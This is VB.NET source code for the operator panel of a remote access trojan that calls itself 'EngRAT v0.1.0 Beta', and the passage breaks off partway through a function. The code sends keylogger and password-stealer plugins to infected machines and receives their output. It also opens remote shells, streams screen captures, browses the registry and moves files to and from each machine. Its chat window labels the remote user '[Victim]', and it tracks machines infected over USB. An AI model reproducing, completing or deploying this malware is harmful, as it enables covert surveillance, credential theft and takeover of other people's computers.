Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.ListView

Public Class ind

    Public Shared ensr As Boolean = True
    Public Shared F As Form1
    Public Shared hac As Integer = 10
    Public Shared hcam As Integer = 7
    Public Shared hco As Integer = 5
    Public Shared hin As Integer = 4
    Public Shared hip As Integer = 1
    Public Shared hname As Integer = 0
    Public Shared hos As Integer = 6
    Public Shared hpc As Integer = 2
    Public Shared hping As Integer = 9
    Public Shared huser As Integer = 3
    Public Shared hvr As Integer = 8
    Private Shared iNotSad As List(Of Client) = New List(Of Client)
    Public Shared ISAd As List(Of Client) = New List(Of Client)
    Public Shared LG As List(Of String) = New List(Of String)
    Public Shared nt As nt = New nt
    Public Shared Plug As List(Of plg) = New List(Of plg)
    Public Shared RC As Integer = 0
    Public Shared SNT As Integer = 0
    Public Shared usb As List(Of Client) = New List(Of Client)
    Public Shared vr As String = "EngRAT v0.1.0 Beta |"
    Public Shared W As SK
    Public Shared Y As String = "|'|'|"

    ' Methods
    Public Shared Function GETPLG(Optional ByVal Name As String = Nothing, Optional ByVal Hash As String = Nothing) As plg
        If (Not Name Is Nothing) Then
            Dim plg2 As plg
            For Each plg2 In ind.Plug
                If (plg2.Name = Name.ToLower) Then
                    Return plg2
                End If
            Next
        End If
        If (Not Hash Is Nothing) Then
            Dim plg3 As plg
            For Each plg3 In ind.Plug
                If (plg3.Hash = Hash) Then
                    Return plg3
                End If
            Next
        End If
        Return Nothing
    End Function

    Public Shared Function Gform(ByVal name As String) As Form
        Return Application.OpenForms.Item(name)
    End Function

    Public Shared Function SendPlug(ByVal c As Client, ByVal p As plg, ByVal ret As Boolean) As Boolean
        Try
            Dim str As String
            If ret Then
                str = ("ret" & ind.Y & p.Hash & ind.Y)
            Else
                str = String.Concat(New String() {"inv", ind.Y, p.Hash, ind.Y, c.ip, ind.Y})
            End If
            Dim stream As New MemoryStream
            If (p.Name = "kl.dll") Then
                str = str.Replace(p.Hash, "kl")
                stream.Write(FN.SB(str), 0, str.Length)
                stream.Write(FN.SB(p.B), 0, p.B.Length)
            Else
                stream.Write(FN.SB(str), 0, str.Length)
                If Not c.plg.Contains(p.Hash) Then
                    stream.Write(FN.SB(p.B), 0, p.B.Length)
                Else
                    stream.WriteByte(40)
                End If
            End If
            c.Ping = -9000
            c.Send(stream.ToArray)
            c.Ping = 0
            stream.Dispose()
            Return True
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Return False
    End Function

    Public Shared Sub SendTo(ByVal O As Object)
        Dim items As SelectedListViewItemCollection = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {0}, Nothing), SelectedListViewItemCollection)
        Try
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim objArray2 As Object() = New Object(1 - 1) {}
                    Dim arguments As Object() = New Object(1 - 1) {}
                    Dim num As Integer = 1
                    arguments(0) = num
                    objArray2(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(O, arguments, Nothing))
                    Dim objArray3 As Object() = objArray2
                    Dim copyBack As Boolean() = New Boolean() {True}
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", objArray3, Nothing, Nothing, copyBack, True)
                    If copyBack(0) Then
                        NewLateBinding.LateIndexSetComplex(O, New Object() {num, RuntimeHelpers.GetObjectValue(objArray3(0))}, Nothing, True, False)
                    End If
                    current.ForeColor = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {2}, Nothing), Color)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Shared Function vno(ByVal l As ListViewItem) As Object
        Dim obj2 As Object
        Try
            obj2 = String.Concat(New String() {l.Text, "/", l.SubItems.Item(ind.hpc).Text, "/", l.SubItems.Item(ind.huser).Text, "/", l.SubItems.Item(ind.hco).Text, "/", l.SubItems.Item(ind.hip).Text})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            obj2 = "?"
            ProjectData.ClearProjectError()
        End Try
        Return obj2
    End Function

    Public Shared Sub Log(ByVal T As String)
        ind.LG.Add((FN.HM & T))
    End Sub

    Delegate Sub _Req(ByVal obj As Object)

    Shared Sub Req(ByVal obj As Object)
        Dim client As Client = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {0}, Nothing), Client)
        Dim b As Byte() = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {1}, Nothing), Byte())
        Dim strArray As String() = Strings.Split(FN.BS(b), ind.Y, -1, CompareMethod.Binary)
        Try
            Dim str5 As String
            Dim bar As ProgressBar
            Dim pr As ToolStripProgressBar
            Dim str4 As String = strArray(0)
            Select Case str4
                Case "get"
                    client.CN = False
                    client.T.Enabled = False
                    Dim up As up = DirectCast(ind.Gform((strArray(1) & strArray(2))), up)
                    If (Not up Is Nothing) Then
                        str5 = "ok"
                        client.Client.Client.Send(FN.SB(str5), 0, 2, SocketFlags.None)
                        ind.SNT = (ind.SNT + 2)
                        Dim num As Integer = 0
                        Try
                            Do While (num <> up.SZ)
                                Dim array As Byte() = New Byte(&H401 - 1) {}
                                Dim num2 As Integer = up.FS.Read(array, 0, array.Length)
                                client.Client.Client.Poll(-1, SelectMode.SelectWrite)
                                client.Client.Client.Send(array, 0, num2, SocketFlags.None)
                                num = (num + num2)
                                ind.SNT = (ind.SNT + num2)
                                bar = up.ProgressBar1
                                bar.Value = (bar.Value + num2)
                            Loop
                            up.Close()
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            up.Text = "Connection lost"
                            up.Lv1.ForeColor = Color.Red
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    Return
                Case "post+"
                    Dim dw As New DW
                    dw.FNNNN = strArray(1)
                    dw.SZ = Conversions.ToInteger(strArray(2))
                    dw.c = client
                    dw.osk = ind.W.GetClient(strArray(3))
                    dw.Name = (dw.osk.ip & strArray(1))
                    dw.Show()
                    Return
                Case "post"
                    client.CN = False
                    client.T.Enabled = False
                    NewLateBinding.LateIndexSet(obj, New Object() {1, FN.SB(String.Concat(New String() {"post+", ind.Y, strArray(1), ind.Y, strArray(2), ind.Y, strArray(3)}))}, Nothing)
                    ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Dim num4 As Integer = 0
                    Do While (ind.Gform((strArray(3) & strArray(1))) Is Nothing)
                        num4 += 1
                        If (num4 = &H3E8) Then
                            Return
                        End If
                        Thread.Sleep(10)
                    Loop
                    str5 = "ok"
                    client.Client.Client.Send(FN.SB(str5), 0, 2, SocketFlags.None)
                    ind.SNT = (ind.SNT + 2)
                    Dim buffer As Byte() = New Byte(&H401 - 1) {}
                    Dim dw2 As DW = DirectCast(ind.Gform((strArray(3) & strArray(1))), DW)
                    Dim num3 As Integer = 0
                    Try
Label_034C:
                        If (num3 = dw2.SZ) Then
                            dw2.Button1.Enabled = False
                            dw2.FS.Close()
                            dw2.FS.Dispose()
                            If File.Exists(dw2.folder) Then
                                File.Delete(dw2.folder)
                            End If
                            File.Move(dw2.tmp, dw2.folder)
                            dw2.Close()
                        Else
                            client.Client.Client.Poll(-1, SelectMode.SelectRead)
                            client.Client.Client.Poll(-1, SelectMode.SelectWrite)
                            If (client.Client.Available > 0) Then
                                buffer = New Byte((client.Client.Available + 1) - 1) {}
                                Dim count As Integer = client.Client.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None)
                                dw2.FS.Write(buffer, 0, count)
                                ind.RC = (ind.RC + count)
                                num3 = (num3 + count)
                                bar = dw2.ProgressBar1
                                bar.Value = (bar.Value + count)
                                dw2.FS.Flush()
                            Else
                                client.Client.GetStream.WriteByte(0)
                                client.Client.GetStream.Flush()
                                ind.SNT += 1
                            End If
                            Thread.Sleep(1)
                            GoTo Label_034C
                        End If
                    Catch exception18 As Exception
                        ProjectData.SetProjectError(exception18)
                        Dim exception2 As Exception = exception18
                        dw2.Text = "connection lost"
                        dw2.ForeColor = Color.Red
                        ProjectData.ClearProjectError()
                    End Try
                    Return
                Case "us"
                    client.IsUSB = True
                    client.L.ForeColor = Color.Blue
                    Dim usb As List(Of Client) = ind.usb
                    SyncLock usb
                        ind.usb.Add(client)
                        Return
                    End SyncLock
                    Exit Select
                Case "RG"
                    Dim reg As Reg = DirectCast(ind.Gform(("reg" & client.ip)), Reg)
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Select Case strArray(1)
                            Case "~"
                                reg.RGk.Enabled = True
                                reg.RGLIST.Enabled = True
                                reg.RGk.SelectedNode.Nodes.Clear()
                                reg.RGLIST.Items.Clear()
                                reg.pr.Value = 0
                                reg.pr.Maximum = (strArray.Length - 3)
                                Dim num20 As Integer = (strArray.Length - 1)
                                Dim i As Integer = 3
                                Do While (i <= num20)
                                    Try
                                        pr = reg.pr
                                        pr.Value += 1
                                        If (strArray(i).Length > 0) Then
                                            If strArray(i).Contains("/") Then
                                                Dim strArray2 As String() = Strings.Split(strArray(i), "/", -1, CompareMethod.Binary)
                                                Dim item As ListViewItem = reg.RGLIST.Items.Add(strArray2(0))
                                                item.SubItems.Add(strArray2(1))
                                                Try
                                                    item.SubItems.Add(strArray2(2))
                                                Catch exception19 As Exception
                                                    ProjectData.SetProjectError(exception19)
                                                    Dim exception3 As Exception = exception19
                                                    ProjectData.ClearProjectError()
                                                End Try
                                                If (strArray2(1) = "String") Then
                                                    item.ImageIndex = 1
                                                Else
                                                    item.ImageIndex = 2
                                                End If
                                            Else
                                                reg.RGk.SelectedNode.Nodes.Add(strArray(i))
                                            End If
                                        End If
                                    Catch exception20 As Exception
                                        ProjectData.SetProjectError(exception20)
                                        Dim exception4 As Exception = exception20
                                        ProjectData.ClearProjectError()
                                    End Try
                                    i += 1
                                Loop
                                reg.RGk.SelectedNode.Expand()
                                reg.RGk.Select()
                                reg.RGk.Focus()
                                Dim num21 As Integer = (reg.RGLIST.Columns.Count - 1)
                                Dim j As Integer = 0
                                Do While (j <= num21)
                                    reg.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    j += 1
                                Loop
                                reg.pr.Value = 0
                                Exit Select
                        End Select
                    End If
                    Return
                Case "rss"
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(ind.Gform(("sh" & client.ip)), shl) Is Nothing) Then
                        Dim shl As New shl
                        shl.Name = ("sh" & client.ip)
                        shl.sk = client
                        shl.Show()
                    End If
                    Return
                Case "rs"
                    Dim shl2 As shl = DirectCast(ind.Gform(("sh" & client.ip)), shl)
                    If (Not shl2 Is Nothing) Then
                        Dim box As RichTextBox = shl2.T1
                        SyncLock box
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.AppendText((FN.DEB(strArray(1).Replace(ChrW(13) & ChrW(10), "")) & ChrW(13) & ChrW(10)))
                            shl2.T1.SelectionStart = shl2.T1.TextLength
                            shl2.T1.ScrollToCaret()
                        End SyncLock
                    End If
                    Return
                Case "rsc"
                    Dim shl3 As shl = DirectCast(ind.Gform(("sh" & client.ip)), shl)
                    If (Not shl3 Is Nothing) Then
                        shl3.Close()
                    End If
                    Return
                Case "sc~"
                    client.L = New ListViewItem
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    ElseIf (DirectCast(ind.Gform(("sc" & client.ip)), sc) Is Nothing) Then
                        Dim sc As New sc
                        sc.osk = ind.W.GetClient(strArray(1))
                        sc.sz = New Size(Conversions.ToInteger(strArray(2)), Conversions.ToInteger(strArray(3)))
                        sc.P.Image = New Bitmap(sc.sz.Width, sc.sz.Height)
                        sc.sk = client
                        sc.Name = ("sc" & client.ip)
                        sc.Show()
                    End If
                    Return
                Case "upk"
                    Dim sc2 As sc = DirectCast(ind.Gform(("sc" & strArray(1))), sc)
                    Return
            End Select




            If (str4 = "scPK") Then
                Dim sc3 As sc = DirectCast(ind.Gform(("sc" & strArray(1))), sc)
                If (sc3 Is Nothing) Then
                    client.CN = False
                    Return
                End If
                If (client.L Is Nothing) Then
                    client.L = New ListViewItem
                End If
                Dim p As PictureBox = sc3.P
                SyncLock p
                    If (sc3.Button1.Text = "Stop") Then
                    End If
                    MsgBox(strArray(2))
                    Dim gstr1 As String = Split(strArray(2), ",", -1, CompareMethod.Binary)(0)
                    MsgBox(CInt(gstr1).ToString)
                    Dim gstr2 As String = Split(strArray(2), ",", -1, CompareMethod.Binary)(1)
                    MsgBox(CInt(gstr2).ToString)
                    Dim size As New Size(Conversions.ToInteger(Strings.Split(strArray(2), ",", -1, CompareMethod.Binary)(0)), Conversions.ToInteger(Strings.Split(strArray(2), ",", -1, CompareMethod.Binary)(1)))
                    Dim bitmap2 As New Bitmap(size.Width, size.Height)
                    Dim graphics As Graphics = graphics.FromImage(bitmap2)
                    Dim num9 As Integer = 0
                    Dim bitmap As Bitmap = DirectCast(sc3.P.Image.Clone, Bitmap)
Label_0B5C:
                    Try
                        graphics.DrawImage(bitmap.GetThumbnailImage(size.Width, size.Height, Nothing, IntPtr.Zero), 0, 0)
                    Catch exception21 As Exception
                        ProjectData.SetProjectError(exception21)
                        Dim exception5 As Exception = exception21
                        num9 += 1
                        If (num9 <> 5) Then
                            ProjectData.ClearProjectError()
                            GoTo Label_0B5C
                        End If
                        ProjectData.ClearProjectError()
                    End Try
                    Dim strArray3 As String() = Strings.Split(strArray(3), ",", -1, CompareMethod.Binary)
                    Dim stream As New MemoryStream(Convert.FromBase64String(strArray3(2)))
                    Dim image As Image = image.FromStream(stream)
Label_0BD3:
                    Try
                        Dim point As New Point(Conversions.ToInteger(strArray3(0)), Conversions.ToInteger(strArray3(1)))
                        graphics.DrawImage(image, point)
                    Catch exception22 As Exception
                        ProjectData.SetProjectError(exception22)
                        Dim exception6 As Exception = exception22
                        If (Not sc3 Is Nothing) Then
                            ProjectData.ClearProjectError()
                            GoTo Label_0BD3
                        End If
                        ProjectData.ClearProjectError()
                    End Try
                    graphics.Dispose()
                    If sc3.CheckBox3.Checked Then
                        Try
                            bitmap2.Save((sc3.Folder & TimeOfDay.TimeOfDay.ToString.Replace("/", "").Replace(":", "-") & Conversions.ToString(CInt(Math.Round(CDbl((CDbl(TimeOfDay.Millisecond) / 1000))))) & ".jpg"))
                        Catch exception23 As Exception
                            ProjectData.SetProjectError(exception23)
                            Dim exception7 As Exception = exception23
                            ProjectData.ClearProjectError()
                        End Try
                    End If
                    sc3.P.Image = bitmap2
                    sc3.Text = (sc3.QQ & " ~Packet[" & FN.Siz(CLng(b.Length)) & "]")
                    Return
                End SyncLock
            End If
            If (str4 = "CH") Then
                If (client.L Is Nothing) Then
                    client.L = New ListViewItem
                End If
                If ind.F.InvokeRequired Then
                    ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                Else
                    Dim chat As chat = DirectCast(ind.Gform(("ch" & client.ip)), chat)
                    Dim str7 As String = strArray(2)
                    If (str7 = "~") Then
                        If (chat Is Nothing) Then
                            chat = New chat
                            chat.Name = ("ch" & client.ip)
                            chat.sk = client
                            chat.osk = ind.W.GetClient(strArray(1))
                            chat.T2.Enabled = False
                            chat.Button1.Enabled = False
                            chat.Show()
                        End If
                    Else
                        If (str7 = "!") Then
                            chat.T2.Enabled = True
                            chat.Button1.Enabled = True
                            Dim chat2 As chat = chat
                            SyncLock chat2
                                chat.T1.AppendText("Connected .." & ChrW(13) & ChrW(10))
                                Return
                            End SyncLock
                        End If
                        If (str7 = "@") Then
                            Dim chat3 As chat = chat
                            SyncLock chat3
                                chat.T1.SelectionStart = chat.T1.TextLength
                                chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
                                chat.T1.AppendText("[Victim] ")
                                chat.T1.SelectionFont = chat.T1.Font
                                chat.T1.AppendText((FN.DEB(strArray(3)) & ChrW(13) & ChrW(10)))
                                chat.T1.SelectionStart = chat.T1.TextLength
                                chat.T1.ScrollToCaret()
                            End SyncLock
                        End If
                    End If
                End If
            Else
                If (str4 = "kla") Then
                    Dim kl As kl = DirectCast(ind.Gform(("kl" & client.ip)), kl)
                    Dim kl3 As kl = kl
                    SyncLock kl3
                        kl.T1.Clear()
                        Dim strArray4 As String() = Strings.Split(FN.DEB(strArray(1)), ChrW(13) & ChrW(10), -1, CompareMethod.Binary)
                        kl.ProgressBar1.Value = 0
                        kl.ProgressBar1.Maximum = strArray4.Length
                        Dim str As String
                        For Each str In strArray4
                            kl.insert(str)
                            bar = kl.ProgressBar1
                            bar.Value += 1
                        Next
                        kl.T1.ScrollToCaret()
                        kl.ProgressBar1.Value = 0
                        kl.ReToolStripMenuItem.Enabled = True
                        If Not Directory.Exists(client.Folder) Then
                            Directory.CreateDirectory(client.Folder)
                        End If
                        kl.T1.SaveFile((client.Folder & "Keylog.rtf"))
                        Return
                    End SyncLock
                End If
                If (str4 = "kl") Then
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        If (ind.Gform(("kl" & client.ip)) Is Nothing) Then
                            Dim kl2 As New kl
                            kl2.c = client
                            kl2.Name = ("kl" & client.ip)
                            kl2.Text = Conversions.ToString(ind.vno(client.L))
                            kl2.Show()
                        End If
                        Dim newThread As New Thread(AddressOf ind.Req)
                        newThread.Start(New Object() {client, FN.SB(("kla" & ind.Y & strArray(1)))})
                    End If
                ElseIf (str4 = "ret") Then
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Dim str8 As String = strArray(1)
                        If (str8 = ind.GETPLG("pw.dll", Nothing).Hash) Then
                            Dim pass As PASS = DirectCast(ind.Gform("Pass"), PASS)
                            If (pass Is Nothing) Then
                                pass = New PASS
                                pass.Show()
                            End If
                            pass.XD(client, FN.DEB(strArray(2)))
                        End If
                    End If
                ElseIf (str4 = "inf") Then
                    Dim list As New List(Of String)
                    list.Add(FN.DEB(strArray(1)))
                    Dim num23 As Integer = (strArray.Length - 1)
                    Dim k As Integer = 2
                    Do While (k <= num23)
                        list.Add(strArray(k))
                        k += 1
                    Loop
                    client.snf = list.ToArray
                    If (ind.F.CEL Is client) Then
                        ind.F.L2.Items.Item(0).SubItems.Item(1).Text = client.snf(0)
                        ind.F.L2.Items.Item(1).SubItems.Item(1).Text = client.snf(1)
                        ind.F.L2.Items.Item(2).SubItems.Item(1).Text = ("%" & client.snf(2) & "%")
                        ind.F.L2.Items.Item(3).SubItems.Item(1).Text = client.snf(3)
                        ind.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                    End If
                ElseIf (str4 = "dw") Then
                    Dim dw3 As DW = DirectCast(ind.Gform((client.ip & strArray(1))), DW)
                    If (dw3 Is Nothing) Then
                        client.Send(("close" & ind.Y & strArray(1)))
                    Else
                        Dim buffer5 As Byte() = DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, ("dw" & ind.Y & strArray(1) & ind.Y)), New Object() {1}, Nothing), Byte())
                        dw3.FS.Write(buffer5, 0, buffer5.Length)
                        dw3.FS.Flush()
                        bar = dw3.ProgressBar1
                        bar.Value = (bar.Value + buffer5.Length)
                        If (dw3.FS.Length = dw3.SZ) Then
                            dw3.FS.Close()
                            client.Send(("close" & ind.Y & strArray(1)))
                            dw3.Button1.Text = "Save"
                        Else
                            client.Send(("de" & ind.Y & strArray(1)))
                        End If
                    End If
                ElseIf (str4 = "up") Then
                    Dim up2 As up = DirectCast(ind.Gform((client.ip & strArray(1))), up)
                    If (up2 Is Nothing) Then
                        client.Send(("close" & ind.Y & strArray(1)))
                    ElseIf (up2.ProgressBar1.Value = up2.ProgressBar1.Maximum) Then
                        client.Send(("close" & ind.Y & strArray(1)))
                        up2.FS.Close()
                        up2.FS.Dispose()
                        up2.Close()
                    Else
                        Dim buffer6 As Byte() = New Byte(&H1401 - 1) {}
                        Dim num11 As Integer = up2.FS.Read(buffer6, 0, buffer6.Length)
                        bar = up2.ProgressBar1
                        bar.Value = (bar.Value + num11)
                        Dim stream2 As New MemoryStream
                        Dim s As String = ("wd" & ind.Y & strArray(1) & ind.Y)
                        stream2.Write(FN.SB(s), 0, s.Length)
                        stream2.Write(buffer6, 0, num11)
                        client.Send(stream2.ToArray)
                        stream2.Dispose()
                    End If
                ElseIf (str4 = "FM") Then
                    If (client.L Is Nothing) Then
                        client.L = New ListViewItem
                    End If
                    Dim fm As FM = DirectCast(ind.Gform(("fm" & client.ip)), FM)
                    Select Case strArray(2)
                        Case "dw"
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                Dim dw4 As New DW
                                dw4.FNNNN = strArray(3)
                                dw4.SZ = Conversions.ToInteger(strArray(4))
                                dw4.c = client
                                dw4.ProgressBar1.Maximum = dw4.SZ
                                dw4.Show()
                                client.Send(("de" & ind.Y & dw4.FNNNN))
                            End If
                            Exit Select
                        Case "~"
                            If (fm Is Nothing) Then
                                If ind.F.InvokeRequired Then
                                    ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                                Else
                                    fm = New FM
                                    fm.sk = client
                                    fm.osk = ind.W.GetClient(strArray(1))
                                    fm.Name = ("fm" & client.ip)
                                    fm.Show()
                                End If
                            End If
                            Exit Select
                        Case "!"
                            fm.L1.Items.Clear()
                            Dim num24 As Integer = (strArray.Length - 1)
                            Dim m As Integer = 3
                            Do While (m <= num24)
                                Dim strArray5 As String() = Strings.Split(FN.DEB(strArray(m)), ";", -1, CompareMethod.Binary)
                                Dim info As New DirectoryInfo(strArray5(0))
                                Dim item2 As ListViewItem = fm.L1.Items.Add(info.Name)
                                item2.ToolTipText = info.FullName
                                item2.SubItems.Add(strArray5(1))
                                Dim str10 As String = strArray5(1)
                                If (str10 = DriveType.Fixed.ToString) Then
                                    item2.ImageIndex = 1
                                ElseIf (str10 = DriveType.Removable.ToString) Then
                                    item2.ImageIndex = 3
                                ElseIf (str10 = DriveType.CDRom.ToString) Then
                                    item2.ImageIndex = 2
                                Else
                                    item2.ImageIndex = 0
                                    item2.SubItems.Item(1).Text = "DIR"
                                End If
                                m += 1
                            Loop
                            fm.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            Exit Select
                        Case "@"
                            Dim bar3 As ToolStripProgressBar = fm.pr
                            SyncLock bar3
                                If fm.Cache.Contains(FN.DEB(strArray(3))) Then
                                    fm.Cache.Remove(FN.DEB(strArray(3)))
                                End If
                                Dim mcach As New FMcach
                                mcach.Path = FN.DEB(strArray(3))
                                fm.Cache.Add(mcach, mcach.Path, Nothing, Nothing)
                                Dim info2 As New DirectoryInfo(FN.DEB(strArray(3)))
                                If (fm.TextBox1.Text = info2.FullName) Then
                                    fm.pr.Value = 0
                                    Dim strArray6 As String() = Strings.Split(strArray(4), ";", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray6.Length - 1)
                                    fm.L2.Items.Clear()
                                    If (Not info2.Parent Is Nothing) Then
                                        Dim item6 As ListViewItem = fm.L2.Items.Add("..", "..", 0)
                                        item6.ToolTipText = info2.Parent.FullName
                                        item6.SubItems.Add("")
                                        item6.SubItems.Add("DIR")
                                        item6 = Nothing
                                    End If
                                    fm.MG2.Images.Clear()
                                    fm.MG2.Images.Add(fm.MG.Images.Item(0))
                                    fm.MG2.Images.Add("*", fm.MG.Images.Item(4))
                                    Dim num25 As Integer = (strArray6.Length - 2)
                                    Dim n As Integer = 0
                                    Do While (n <= num25)
                                        If (fm.TextBox1.Text <> info2.FullName) Then
                                            Return
                                        End If
                                        Dim item7 As ListViewItem = fm.L2.Items.Add((info2.FullName & FN.DEB(strArray6(n))), FN.DEB(strArray6(n)), 0)
                                        item7.SubItems.Add("")
                                        item7.SubItems.Add("DIR")
                                        item7.ToolTipText = (info2.FullName & item7.Text)
                                        mcach.folders.Add(item7.ToolTipText)
                                        item7 = Nothing
                                        pr = fm.pr
                                        pr.Value += 1
                                        n += 1
                                    Loop
                                    fm.TextBox1.BackColor = Color.Gainsboro
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    client.Send(("@" & ind.Y & strArray(3)))
                                    fm.pr.Value = 0
                                End If
                            End SyncLock
                            Exit Select
                        Case "#"
                            Dim bar4 As ToolStripProgressBar = fm.pr
                            SyncLock bar4
                                Dim mcach2 As FMcach = DirectCast(fm.Cache.Item(FN.DEB(strArray(3))), FMcach)
                                Dim str3 As String = FN.DEB(strArray(3))
                                If (fm.TextBox1.Text = str3) Then
                                    fm.pr.Value = 0
                                    Dim strArray7 As String() = Strings.Split(strArray(4), ";", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray7.Length - 1)
                                    Dim num26 As Integer = (strArray7.Length - 2)
                                    Dim num14 As Integer = 0
                                    Do While (num14 <= num26)
                                        Dim strArray8 As String() = Strings.Split(FN.DEB(strArray7(num14)), ";", -1, CompareMethod.Binary)
                                        If (fm.TextBox1.Text <> str3) Then
                                            Return
                                        End If
                                        Dim item8 As ListViewItem = fm.L2.Items.Add((str3 & strArray8(0)), strArray8(0), 1)
                                        Dim info3 As New FileInfo((str3 & strArray8(0)))
                                        item8.ToolTipText = info3.FullName
                                        item8.SubItems.Add(FN.Siz(Conversions.ToLong(strArray8(1))))
                                        If (info3.Extension = "") Then
                                            item8.SubItems.Add("")
                                        Else
                                            item8.SubItems.Add(info3.Extension.Replace(".", ""))
                                            If Not fm.MG2.Images.ContainsKey(info3.Extension) Then
                                                File.Create((Application.StartupPath & "\!" & info3.Extension)).Close()
                                                fm.MG2.Images.Add(info3.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info3.Extension)))
                                                File.Delete((Application.StartupPath & "\!" & info3.Extension))
                                                item8.ImageKey = info3.Extension
                                            Else
                                                item8.ImageKey = info3.Extension
                                            End If
                                        End If
                                        mcach2.files.Add(String.Concat(New String() {item8.ToolTipText, ";", item8.SubItems.Item(1).Text, ";", item8.SubItems.Item(2).Text}))
                                        item8 = Nothing
                                        pr = fm.pr
                                        pr.Value += 1
                                        num14 += 1
                                    Loop
                                    fm.TextBox1.BackColor = Color.WhiteSmoke
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    fm.pr.Value = 0
                                End If
                            End SyncLock
                            Exit Select
                        Case "$"
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                If fm.Images.Contains(FN.DEB(strArray(3))) Then
                                    fm.Images.Remove(FN.DEB(strArray(3)))
                                End If
                                fm.Images.Add(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(4)))), FN.DEB(strArray(3)), Nothing, Nothing)
                                If (fm.L2.Items.ContainsKey(FN.DEB(strArray(3))) AndAlso fm.L2.Items.Item(FN.DEB(strArray(3))).Selected) Then
                                    fm.P.Image = DirectCast(fm.Images.Item(FN.DEB(strArray(3))), Image)
                                    fm.P.Visible = True
                                End If
                            End If
                            Exit Select
                        Case "%"
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                Dim note As New Note
                                note.FNN = FN.DEB(strArray(3))
                                note.Text = (fm.QQ & " - " & note.FNN)
                                note.SK = fm.sk
                                note.TextBox1.Text = FN.DEB(strArray(4)).Replace(ChrW(0), "")
                                note.Show()
                                note.SaveToolStripMenuItem.Enabled = False
                            End If
                            Exit Select
                        Case "dl"
                            Dim enumerator As IEnumerator = Nothing
                            Dim strArray9 As String() = Strings.Split(FN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                            Try
                                enumerator = fm.L2.Items.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                    If (strArray9(1) = "*") Then
                                        If Not ((current.Text = New DirectoryInfo(strArray9(0)).Name) And (current.SubItems.Item(2).Text = "DIR")) Then
                                            Continue Do
                                        End If
                                        current.Remove()
                                        Return
                                    End If
                                    If ((current.Text = New DirectoryInfo(strArray9(0)).Name) And (current.SubItems.Item(2).Text <> "DIR")) Then
                                        current.Remove()
                                        Return
                                    End If
                                Loop
                            Finally
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                            Exit Select
                        Case "nm"
                            Dim enumerator As IEnumerator = Nothing
                            Dim strArray10 As String() = Strings.Split(FN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                            Try
                                enumerator = fm.L2.Items.GetEnumerator
                                Do While enumerator.MoveNext
